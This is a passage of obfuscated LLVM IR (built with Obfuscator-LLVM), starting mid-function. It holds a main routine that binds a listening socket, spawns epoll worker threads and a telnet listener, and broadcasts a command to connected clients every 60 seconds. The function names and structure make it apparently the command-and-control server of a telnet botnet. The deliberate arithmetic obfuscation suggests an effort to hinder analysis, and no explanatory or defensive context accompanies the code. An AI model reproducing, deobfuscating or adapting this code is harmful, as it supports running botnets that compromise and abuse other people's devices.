  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i32 0, i32 0))
  br label %93

; <label>:93:                                     ; preds = %92, %32
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = inttoptr i64 %95 to i8*
  %97 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %96) #7
  br label %32
                                                  ; No predecessors!
  %99 = load i8*, i8** %2, align 8
  ret i8* %99
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca [20 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %15 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %16 = load i32, i32* %5, align 4
  %17 = icmp ne i32 %16, 4
  br i1 %17, label %18, label %24

; <label>:18:                                     ; preds = %3
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i8**, i8*** %6, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i32 0, i32 0), i8* %22)
  call void @exit(i32 1) #10
  unreachable

; <label>:24:                                     ; preds = %3
  %25 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %25, %struct._IO_FILE** @fileFD, align 8
  %26 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %26, %struct._IO_FILE** @kfileFD, align 8
  %27 = load i8**, i8*** %6, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 3
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29) #8
  store i32 %30, i32* %10, align 4
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %9, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp sgt i32 %35, 850
  br i1 %36, label %37, label %39

; <label>:37:                                     ; preds = %24
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.103, i32 0, i32 0))
  ret i32 0

; <label>:39:                                     ; preds = %24
  %40 = load i32, i32* %10, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i32 0, i32 0), i32 %40)
  %42 = load i8**, i8*** %6, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @create_and_bind(i8* %44)
  store volatile i32 %45, i32* @listenFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %39
  call void @abort() #10
  unreachable

; <label>:49:                                     ; preds = %39
  %50 = load volatile i32, i32* @listenFD, align 4
  %51 = call i32 @make_socket_non_blocking(i32 %50)
  store i32 %51, i32* %8, align 4
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %49
  call void @abort() #10
  unreachable

; <label>:55:                                     ; preds = %49
  %56 = load volatile i32, i32* @listenFD, align 4
  %57 = call i32 @listen(i32 %56, i32 128) #7
  store i32 %57, i32* %8, align 4
  %58 = load i32, i32* %8, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %55
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:61:                                     ; preds = %55
  %62 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %62, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @epollFD, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %61
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:66:                                     ; preds = %61
  %67 = load volatile i32, i32* @listenFD, align 4
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %69 = bitcast %union.epoll_data* %68 to i32*
  store i32 %67, i32* %69, align 1
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %70, align 1
  %71 = load volatile i32, i32* @epollFD, align 4
  %72 = load volatile i32, i32* @listenFD, align 4
  %73 = call i32 @epoll_ctl(i32 %71, i32 1, i32 %72, %struct.epoll_event* %11) #7
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %66
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:77:                                     ; preds = %66
  %78 = load i32, i32* %9, align 4
  %79 = add i32 %78, -212341684
  %80 = add i32 %79, 2
  %81 = sub i32 %80, -212341684
  %82 = add nsw i32 %78, 2
  %83 = zext i32 %81 to i64
  %84 = call i8* @llvm.stacksave()
  store i8* %84, i8** %14, align 8
  %85 = alloca i64, i64 %83, align 16
  br label %86

; <label>:86:                                     ; preds = %92, %77
  %87 = load i32, i32* %9, align 4
  %88 = sub i32 0, -1
  %89 = sub i32 %87, %88
  %90 = add nsw i32 %87, -1
  store i32 %89, i32* %9, align 4
  %91 = icmp ne i32 %87, 0
  br i1 %91, label %92, label %102

; <label>:92:                                     ; preds = %86
  %93 = load i32, i32* %9, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, 1
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add nsw i32 %93, 1
  %99 = sext i32 %97 to i64
  %100 = getelementptr inbounds i64, i64* %85, i64 %99
  %101 = call i32 @pthread_create(i64* %100, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  br label %86

; <label>:102:                                    ; preds = %86
  %103 = getelementptr inbounds i64, i64* %85, i64 0
  %104 = load i32, i32* %10, align 4
  %105 = sext i32 %104 to i64
  %106 = inttoptr i64 %105 to i8*
  %107 = call i32 @pthread_create(i64* %103, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %106) #7
  br label %108

; <label>:108:                                    ; preds = %109, %102
  br label %109

; <label>:109:                                    ; preds = %108
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0))
  %110 = call i32 @sleep(i32 60)
  br label %108
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %28
  br label %63

; <label>:42:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #7
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #7
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %48
  br label %67

; <label>:60:                                     ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

; <label>:63:                                     ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25

; <label>:67:                                     ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:73:                                     ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #7
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
